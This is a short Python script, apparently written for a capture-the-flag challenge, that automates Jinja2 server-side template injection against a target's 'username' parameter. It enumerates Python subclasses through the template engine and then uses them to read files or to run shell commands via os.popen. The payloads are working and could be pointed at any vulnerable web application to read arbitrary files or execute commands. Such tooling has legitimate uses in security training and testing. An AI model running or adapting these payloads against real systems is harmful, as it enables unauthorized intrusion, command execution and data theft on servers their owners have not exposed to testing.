#!/usr/bin/env python3
# Jinja2 SSTI probe + file read.
# Walks ''.__class__.__mro__[2].__subclasses__() to find a class that can read
# files / run commands, then reads the flag.
#
# Usage: set TARGET below (or pass as argv[1]) to your authorized challenge host.
import sys
import requests
from time import sleep

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://TARGET_HOST:PORT/"
PARAM = "username"
TIMEOUT = 10
MAX_IDX = 200
VERIFY = False  # self-signed lab certs

requests.packages.urllib3.disable_warnings()


def get(payload):
    try:
        r = requests.get(BASE, params={PARAM: payload}, timeout=TIMEOUT, verify=VERIFY)
        return r.text
    except Exception as e:
        print("Request error:", e)
        return ""


def probe_names():
    hits = []
    for i in range(MAX_IDX + 1):
        out = get("{{''.__class__.__mro__[2].__subclasses__()[%d].__name__}}" % i)
        snippet = out.strip()[:200]
        if any(x in snippet.lower() for x in ("file", "popen", "posix", "binascii", "open", "os")):
            print("[+] index %d -> %s" % (i, snippet.replace("\n", "\\n")))
            hits.append(i)
        sleep(0.03)
    return hits


def try_read_index(i):
    payloads = [
        "{{''.__class__.__mro__[2].__subclasses__()[%d]('/flag').read()}}" % i,
        "{{''.__class__.__mro__[2].__subclasses__()[%d]('/flag.txt').read()}}" % i,
        "{{''.__class__.__mro__[2].__subclasses__()[%d].__init__.__globals__['os'].popen('cat /flag').read()}}" % i,
        "{{''.__class__.__mro__[2].__subclasses__()[%d].__init__.__globals__['os'].popen('cat /flag.txt').read()}}" % i,
    ]
    for p in payloads:
        out = get(p)
        if out and ("ctf{" in out.lower() or "flag" in out.lower()):
            print("[***] payload:\n%s\n\nresponse:\n%s" % (p, out[:2000]))
            return True
    return False


if __name__ == "__main__":
    print("== SSTI probe ==")
    for idx in probe_names():
        if try_read_index(idx):
            sys.exit(0)
    for i in range(MAX_IDX + 1):
        if try_read_index(i):
            sys.exit(0)
    print("[-] No flag found; raise MAX_IDX or inspect a subclasses dump manually.")
